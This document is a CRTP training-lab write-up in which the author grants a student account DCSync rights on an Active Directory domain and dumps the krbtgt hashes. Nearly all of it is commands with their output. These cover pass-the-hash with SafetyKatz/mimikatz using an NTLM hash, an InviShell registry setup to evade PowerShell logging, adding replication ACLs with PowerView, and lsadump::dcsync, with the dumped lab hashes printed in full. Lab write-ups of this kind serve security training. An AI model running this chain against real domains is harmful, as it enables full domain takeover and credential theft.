# CRTP: Hands-On 12

```
  • Check if studentx has Replication (DCSync) rights.
  • If yes, execute the DCSync attack to pull hashes of the krbtgt user.
  • If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.
```

Index:
  
  1. [Check student Dcsync permissions](#check-student-dcsync-permissions)
  2. [Set student permissions](#set-student-permissions)
  3. [Abusse dcsync for krbtgt](#abuse-dcsync-for-krbtgt)

## Check student Dcsync permissions

Evaluate permissions for student with using ACLs on the target domain:
```
PS C:\Users\student162> Get-DomainObjectAcl -SearchBase 'DC=dollarcorp,DC=moneycorp,DC=local' -SearchScope Base -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -like '*student*'}
```


## Set student permissions
spawn cmd with domain privileges:
```
C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "privilege::debug" "sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd
user    : svcadmin
domain  : dollarcorp.moneycorp.local
program : cmd
impers. : no
NTLM    : b38ff50264b74508085d82c69794a4d8
  |  PID  4380
  |  TID  6888
  |  LSA Process is now R/W
  |  LUID 0 ; 129442536 (00000000:07b722e8)
  \_ msv1_0   - data copy @ 000001D2F02B2E70 : OK !
  \_ kerberos - data copy @ 000001D2F05144A8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001D2EFD8FAA8 (32) -> null

mimikatz(commandline) # exit
Bye!

```
Using Powerview set DCsync rigths to student162 on dollarcorp.moneycorp.local

```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Windows\system32>set COR_ENABLE_PROFILING=1

C:\Windows\system32>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.

C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> Import-Module C:\AD\Tools\PowerView.ps1
PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student162 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(|(|(samAccountName=student162)(name=student162)(displayname=student162)))
VERBOSE: [Get-DomainSearcher] search base:
LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Invoke-LDAPQuery] filter string:
(&(|(|(samAccountName=student162)(name=student162)(displayname=student162))))
VERBOSE: [Get-DomainObject] Error disposing of the Results object: Method invocation failed because
[System.DirectoryServices.SearchResult] does not contain a method named 'dispose'.
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (|(distinguishedname=DC=dollarcorp,DC=moneycorp,DC=local))
VERBOSE: [Get-DomainSearcher] search base:
LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Invoke-LDAPQuery] filter string: (&(|(distinguishedname=DC=dollarcorp,DC=moneycorp,DC=local)))
VERBOSE: [Get-DomainObject] Error disposing of the Results object: Method invocation failed because
[System.DirectoryServices.SearchResult] does not contain a method named 'dispose'.
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student162,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local 'DCSync'
on DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student162,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local rights
GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student162,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local rights
GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=student162,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local rights
GUID '89e95b76-444d-4c62-991a-0facbeda640c' on DC=dollarcorp,DC=moneycorp,DC=local
PS C:\Windows\system32>
```

validate permissions:

```
 Get-DomainObjectAcl -SearchBase 'DC=dollarcorp,DC=moneycorp,DC=local' -SearchScope Base -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -like '*student*'}


AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-5102
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student162

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-5102
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student162

AceQualifier           : AccessAllowed
ObjectDN               : DC=dollarcorp,DC=moneycorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-719815819-3726368948-3917688648
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-719815819-3726368948-3917688648-5102
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : dcorp\student162

```

## Abusse dcsync for krbtgt

Using student162 user for dump krbtgt user with DCsync privileges:
*** Logoff session in order to update the authenticate ticket on the student machine
```
C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:dcorp\krbtgt
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
      des_cbc_md5       (4096) : 150ea2e934ab6b80

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 150ea2e934ab6b80

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  a0e60e247b498de4cacfac3ba615af01
    02  86615bb9bf7e3c731ba1cb47aa89cf6d
    03  637dfb61467fdb4f176fe844fd260bac
    04  a0e60e247b498de4cacfac3ba615af01
    05  86615bb9bf7e3c731ba1cb47aa89cf6d
    06  d2874f937df1fd2b05f528c6e715ac7a
    07  a0e60e247b498de4cacfac3ba615af01
    08  e8ddc0d55ac23e847837791743b89d22
    09  e8ddc0d55ac23e847837791743b89d22
    10  5c324b8ab38cfca7542d5befb9849fd9
    11  f84dfb60f743b1368ea571504e34863a
    12  e8ddc0d55ac23e847837791743b89d22
    13  2281b35faded13ae4d78e33a1ef26933
    14  f84dfb60f743b1368ea571504e34863a
    15  d9ef5ed74ef473e89a570a10a706813e
    16  d9ef5ed74ef473e89a570a10a706813e
    17  87c75daa20ad259a6f783d61602086aa
    18  f0016c07fcff7d479633e8998c75bcf7
    19  7c4e5eb0d5d517f945cf22d74fec380e
    20  cb97816ac064a567fe37e8e8c863f2a7
    21  5adaa49a00f2803658c71f617031b385
    22  5adaa49a00f2803658c71f617031b385
    23  6d86f0be7751c8607e4b47912115bef2
    24  caa61bbf6b9c871af646935febf86b95
    25  caa61bbf6b9c871af646935febf86b95
    26  5d8e8f8f63b3bb6dd48db5d0352c194c
    27  3e139d350a9063db51226cfab9e42aa1
    28  d745c0538c8fd103d71229b017a987ce
    29  40b43724fa76e22b0d610d656fb49ddd


mimikatz(commandline) # exit
Bye!

```


